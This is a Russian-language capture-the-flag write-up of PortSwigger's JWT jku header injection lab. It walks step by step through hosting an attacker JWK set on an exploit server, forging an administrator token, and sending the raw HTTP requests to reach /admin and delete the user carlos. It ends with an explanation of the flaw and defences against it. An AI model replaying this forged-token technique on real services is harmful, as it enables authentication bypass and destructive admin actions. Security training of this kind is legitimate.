
### Ввод самоподписанных JWT с помощью параметра jku

иногда в сервере не заблокирована возможность подгружать конфигурации jwt через URL с помощью  ==jku==
Набор JWK - это объект JSON, содержащий массив JWK, представляющий различные ключи
пример набора JWK с 2 мя ключами
```json
{ "keys": [

 { "kty": "RSA", 
 "e": "AQAB",
  "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab", 
  "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ" }, 
  
  { "kty": "RSA", 
  "e": "AQAB",
   "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
    "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw" } ] 
    }
```


-----

##### обход аутентификации JWT с помощью ввода заголовка jku
лаба https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
Сервер поддерживает `jku` параметр в заголовке JWT
однако сервер не проверяет принадлежит ли указанный URL-адрес доверенному домену

задание:
нужно как-то заставить сервер прочесть мой jku и
попасть в `/admin`, затем удалите пользователя `carlos`

в лабе есть - эксплойт сервер - то есть там можно оставить видимо свой Набор JWK
и заставить сервер сделатть запрос к моему эксплойт серверу!
это типо SSRF получается!

----

залогинился - wiener

вот селф запрос 

```http
GET /my-account?id=wiener HTTP/2
Host: 0acf00ac03e21f86802c946000f00079.web-security-academy.net
Cookie: session=eyJraWQiOiIwMGZkOTBkYS04ZmZlLTQ5NDktYTY3My1lNWM3MDNiMDY2NWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU1MTc4MCwic3ViIjoid2llbmVyIn0.LKJSjf12DJFGLGdCHPH_Mh7AbeUAfdK9pUXIpDN10QonhvPOVaudZFfigDxuynzhLsClJiA7Jk5X4Q-VPso958qKhd3xMqYtt_lGOMDQ91bWOutNEPEgv5gTM8zwPDMp4E2dtyx1lqAeEVsIK7IqSvlNoupWu-Yu4llpmqk4em4tfYlNt5heL7pjWWIOMHKIQR0Ntk_iiRGVWjZjKhPF6CCrYEb_axaywOdcTrNqvj3ddDerFLzMCYSTh-gJqy4G_HiTrkQHCRpGtlRD4fY_xg3MvvuSpF4JAyYTeJmuDzpw4ZsOjKo_Dgr8IkVm1Wmggzz3z4k8hOTCCQGuJHew6Q
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0acf00ac03e21f86802c946000f00079.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

разбор jwt

```json

{"kid":"00fd90da-8ffe-4949-a673-e5c703b0665c","alg":"RS256"} // хедер RS256 -асимметр

{"iss":"portswigger","exp":1772551780,"sub":"wiener"}  // пейлоад

и большая подпись

LKJSjf12DJFGLGdCHPH_Mh7AbeUAfdK9pUXIpDN10QonhvPOVaudZFfigDxuynzhLsClJiA7Jk5X4Q-VPso958qKhd3xMqYtt_lGOMDQ91bWOutNEPEgv5gTM8zwPDMp4E2dtyx1lqAeEVsIK7IqSvlNoupWu-Yu4llpmqk4em4tfYlNt5heL7pjWWIOMHKIQR0Ntk_iiRGVWjZjKhPF6CCrYEb_axaywOdcTrNqvj3ddDerFLzMCYSTh-gJqy4G_HiTrkQHCRpGtlRD4fY_xg3MvvuSpF4JAyYTeJmuDzpw4ZsOjKo_Dgr8IkVm1Wmggzz3z4k8hOTCCQGuJHew6Q
```


----

чтобы заставить сервер сделать запрос к моему эксплойт серверу:
вот к этому эксплойт серверу
` https://exploit-0af00041032d1f3b80a993c7015b0094.exploit-server.net/exploit`

можно пробовать добавить доп параметры хоста или рефера или указать через символы

либо изменить рефер Referer

либо положить ссылку на экплойт сервер в самом JWT

----------

скорее всего тут нужно сделать так , чтобы ссылка на сервер была в самом JWT

---

итак: 

🟣первое - сделать пару ключей:

создал в бурпе в JWT EDITOR пару ключей RSA
вот этот набор ключей

```json
{  
    "p": "0e3ALNUWNBE5VROaK8VE2vsDJCbKKWQkhnfgE1V7beyQR4KrcebD3vnsEB4DZtTabYlWzCvlTjsZtW2b9XEk09uVOxuC1dk4fP-uiGjidBpued9VtA4GTCsQTS_dzJrGpRgUsjh5tZJQsyavKfilZZsQQW6EmUFvF3kJNOgAWQc",  
    "kty": "RSA",  
    "q": "w0sahgPQr4UAUWDMBEEr-oUdi75J-NXeUbVcB4TONI0lgayyd5jWE9QDfgP_IAd5ALckNN9OJnhav0WuzpMwW3zKHycFTUbjGvzONwYlgjmtu_q6Wgo-a-ySSVWLQhwL1iIOjpSBmhjjUWMGa37-bEo6EBObMD83z8bOXIcIgVU",  
    "d": "RowTggmyYj-eKNzppfIaEz39xWq7TCHJ55DKv-FAtdyWCwMKrZFc9qRcjeCrvJHYMhJXYtP80y6nE0RasS5fOi-dq6rqruMtbFuER4Z1BFKdAjC8K2eKrB65vxrFDsiRtI4yap-N9T67CMt4Rap-XFKDyYrXGNQ3B60ZqQol1eT0xHEWN4QMUBtVZW4ziZ5Rb0JEToLoGkCFMpH28LvtMvxMbHNbMAZRa0NGPUl8F_yl8-9DDvxaag60DYgQQap39nc1sf9lQOTQH5tH_-VAq3FwDwI5-vVTMHYU5LE0d18JMXpzf4l_sefpqIaI8ep7cueT0YTfN399aq6JAk_h0Q",  
    "e": "AQAB",  
    "kid": "18074576-009a-406d-99d5-43f885096e19",  
    "qi": "FzMdCV4lCrynrySr68pIrXgyx7Rt5IQTXXhuKCjZzqFEGbz_3DyIfbzLrRwz0EXZ34eH1I4foYdyqVs3i12sSOqfMMXXjCUyoPB6mabWwCdw8lWC4t9etKUjLOMp1H6j5XXl1T0Q80foub2zd38Xzb_UUOCO3kIsaooVQVJLwzI",  
    "dp": "t6MDlfQ8_QUIIw0HszxYdDpZ0BkChVytutdIM4F2fH0Q5Q1ATl3wf7AeOScYEK8n9-PJAsdvSpTWc2fTosv7zDvseg0h0VG4YVgEZB1j4u5wL7oXLW-LQLv3AZ5apq3KEQdUq2ZNyXCZmW3AkrWIca5IdQRph-q-dEkTra05CKc",  
    "dq": "PMcm3gZZ8AYIb0scs0ZFFZZP96mlA9grdGpo1b4zHo--2HiSoj3ighE9dP5xa9pngh19GydT_wz90QEywf900UQo80EFmWMyUrfSxbUX_0tMEnCZhmQhwRzC-iexS0XHOUEoHp-BJiAQvsd-u_2t2K3RHCe96GoESJmqp4ku0HE",  
    "n": "oCWvyX6KZqFsszfnewXw-RD7Jzc_9XmpAXXeD9HA0j0BpVCDPfKUXkoNiJ786E2B3smn-bdkI-0CKbT22EQa0dyiwzFpctk3jwDEq0UwEWBvapVGo3Cv0YwsdZXgjW5Cw2ZWcjF8Ic7yyJDdw7DwZpXJu38cLW4dA1FKM_8RXNYjiZlVnxbXkGez54LomyULmvCawxMFmGsVfsDu6ZCbtXiz0kaNZZSI0X0k-KHnHqj_-5wbFJhcX2cIHPBDht3KtY-TF60_zhFaIadlbEaNimEWYHDcE2cpQWBFtgorZW7xD5JDWrndC1bhVqckpLLacDcQoHlst9AlAMbyrjIWUw"  
}
```

-------

🟣 шаг второй!! разместить на сервере набор ключей

создаю пейлоад набор JWKs ключей который я только что получил!

```json
{
    "keys": [
        {
            "kty": "RSA",
            "kid": "18074576-009a-406d-99d5-43f885096e19",
            "e": "AQAB",
            "n": "oCWvyX6KZqFsszfnewXw-RD7Jzc_9XmpAXXeD9HA0j0BpVCDPfKUXkoNiJ786E2B3smn-bdkI-0CKbT22EQa0dyiwzFpctk3jwDEq0UwEWBvapVGo3Cv0YwsdZXgjW5Cw2ZWcjF8Ic7yyJDdw7DwZpXJu38cLW4dA1FKM_8RXNYjiZlVnxbXkGez54LomyULmvCawxMFmGsVfsDu6ZCbtXiz0kaNZZSI0X0k-KHnHqj_-5wbFJhcX2cIHPBDht3KtY-TF60_zhFaIadlbEaNimEWYHDcE2cpQWBFtgorZW7xD5JDWrndC1bhVqckpLLacDcQoHlst9AlAMbyrjIWUw"
        }
    ]
}
```
записываю этот набор на эксплойт сервер!
AQAB - это стандарт, это число 65537 (это типо как кодируется ключ - часть ключа, эти буквы - это здоровое число)

--------

🟣 шаг третий  добавить jku в заголовок

нужно поменять ориг заголовок на такой - который заставит сервер сходит на мой сервер

kid можно оставить родной / но можно и заменить на то - что я получил выше

```json

оригинал хедер  (нужно добавить jku)

{"kid":"00fd90da-8ffe-4949-a673-e5c703b0665c","alg":"RS256"}

меняю на 

{
    "kid": "00fd90da-8ffe-4949-a673-e5c703b0665c",
    "alg": "RS256",
    "jku": "https://exploit-0af00041032d1f3b80a993c7015b0094.exploit-server.net/exploit"
}

```
`https://exploit-0af00041032d1f3b80a993c7015b0094.exploit-server.net/exploit` этот сервер дан в лабе


🟣 шаг четвертый

нужно поменять ориг пейлоад на админский (но для начала можно проверить и с ориг хедером, но в лабе сразу дан путь /admin - так что можно сразу на админа менять )

```json
вот ориг пейлоад 
{"iss":"portswigger","exp":1772551780,"sub":"wiener"}  // пейлоад

меняю на 

{
    "iss": "portswigger",
    "exp": 1772551780,
    "sub": "administrator"
}

```


🟣 шаг  пятый - самый важный - переподписать JWT

так как параметры были изменены - нужно все поменять
беру кид ключ который создал
` "kid": "18074576-009a-406d-99d5-43f885096e19", `

и подписываю им JWT = создаю подпись!

вот так:

<img src="../../assets/2026-03-0319.54.38.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />




только поменял еще wiener на administrator и пото уже новую подпись создал

и вот получил новый JWT
```json
eyJqa3UiOiJodHRwczovL2V4cGxvaXQtMGFmMDAwNDEwMzJkMWYzYjgwYTk5M2M3MDE1YjAwOTQuZXhwbG9pdC1zZXJ2ZXIubmV0L2V4cGxvaXQiLCJraWQiOiIxODA3NDU3Ni0wMDlhLTQwNmQtOTlkNS00M2Y4ODUwOTZlMTkiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU1MTc4MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.evt08XhRNISU7jV9v4dp1_t3tTLhKGLZfL-z3w57b15yo7UVBgO5QehRJB006ZE0OVTfP5lEW_1O_V1P2Bs9U3UZdK6SaxZ5JZdTNYTpupbBlWVwtNoK-7hYPSuOQAUTCp_efy4tEMt9rizPJEKP_gwrUWP1FpHFWxbthaojnj3XVL1a4AHIotPDMOKXwTRCE4_NGOyFr3T83uUMmprcL3hPfiNnhDGbYBDUKP-q57L83i_4Z7bGg_uvkA5NLuKhYaPmS8BoDgNAdF8M_geIoh9imkNycymRXfzMRqzVqbVCdU8BR2dOXU0ZpjgZeeVBOgTNf3atfj_CpWHncQypkA
```




🟣 шаг шестой! 
нужно использовать новый jwt и отправить запрос по пути /admin (известно из задания лабы)

отправляю запрос 
```http
GET /admin HTTP/2
Host: 0acf00ac03e21f86802c946000f00079.web-security-academy.net
Cookie: session=eyJqa3UiOiJodHRwczovL2V4cGxvaXQtMGFmMDAwNDEwMzJkMWYzYjgwYTk5M2M3MDE1YjAwOTQuZXhwbG9pdC1zZXJ2ZXIubmV0L2V4cGxvaXQiLCJraWQiOiIxODA3NDU3Ni0wMDlhLTQwNmQtOTlkNS00M2Y4ODUwOTZlMTkiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU1MTc4MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.evt08XhRNISU7jV9v4dp1_t3tTLhKGLZfL-z3w57b15yo7UVBgO5QehRJB006ZE0OVTfP5lEW_1O_V1P2Bs9U3UZdK6SaxZ5JZdTNYTpupbBlWVwtNoK-7hYPSuOQAUTCp_efy4tEMt9rizPJEKP_gwrUWP1FpHFWxbthaojnj3XVL1a4AHIotPDMOKXwTRCE4_NGOyFr3T83uUMmprcL3hPfiNnhDGbYBDUKP-q57L83i_4Z7bGg_uvkA5NLuKhYaPmS8BoDgNAdF8M_geIoh9imkNycymRXfzMRqzVqbVCdU8BR2dOXU0ZpjgZeeVBOgTNf3atfj_CpWHncQypkA
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0acf00ac03e21f86802c946000f00079.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

на эксплойт сервер - вижу - что сторонний запрос на сервер был!
`10.0.3.31       2026-03-03 14:57:14 +0000 "GET /exploit HTTP/1.1" 200 "User-Agent: Java/21.0.1"`

в ответ мне пришла админка - ура!!

доступ к админке получен!!

то есть сервер прочел токен с моего эксплойт сервера и им расшифровал мой JWT

копирую пути для делита карлоса (по заданию)

```html
                           <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
```

🟣 шаг  7
удаляю карлоса

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0acf00ac03e21f86802c946000f00079.web-security-academy.net
Cookie: session=eyJqa3UiOiJodHRwczovL2V4cGxvaXQtMGFmMDAwNDEwMzJkMWYzYjgwYTk5M2M3MDE1YjAwOTQuZXhwbG9pdC1zZXJ2ZXIubmV0L2V4cGxvaXQiLCJraWQiOiIxODA3NDU3Ni0wMDlhLTQwNmQtOTlkNS00M2Y4ODUwOTZlMTkiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU1MTc4MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.evt08XhRNISU7jV9v4dp1_t3tTLhKGLZfL-z3w57b15yo7UVBgO5QehRJB006ZE0OVTfP5lEW_1O_V1P2Bs9U3UZdK6SaxZ5JZdTNYTpupbBlWVwtNoK-7hYPSuOQAUTCp_efy4tEMt9rizPJEKP_gwrUWP1FpHFWxbthaojnj3XVL1a4AHIotPDMOKXwTRCE4_NGOyFr3T83uUMmprcL3hPfiNnhDGbYBDUKP-q57L83i_4Z7bGg_uvkA5NLuKhYaPmS8BoDgNAdF8M_geIoh9imkNycymRXfzMRqzVqbVCdU8BR2dOXU0ZpjgZeeVBOgTNf3atfj_CpWHncQypkA
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="14
...
..
.

```

карлос -удален! - лаба решена!!

-------
-----
-----

#### выводы  
уязвимость в том, что сервер доверяет параметру jku и подгружает ключи с любого урла, даже с недоверенного

это позволяет атакующему разместить свой набор ключей на своём сервере и заставить сервер использовать их для проверки подписи

по сути это ssrf, замаскированный под штатную функцию

сервер делает исходящий запрос на мой эксплойт сервер, забирает мой публичный ключ, и с его помощью верифицирует токен, который я подписал своим приватным

весь смысл атаки в том, что сервер не проверяет происхождение ключей, а просто берёт то, что ему дали

#### защита  

надо полностью отключить поддержку jku, если она не нужна

если без неё никак, то внедрять строгий белый список доверенных доменов, с которых разрешено загружать ключи

проверять не только домен, но и протокол (только https), и не допускать открытых редиректов внутри доверенных доменов

плюс всегда проверять, что загруженный ключ действительно соответствует ожидаемому формату и не подделан

ключи должны храниться на сервере, а не загружаться по указке клиента





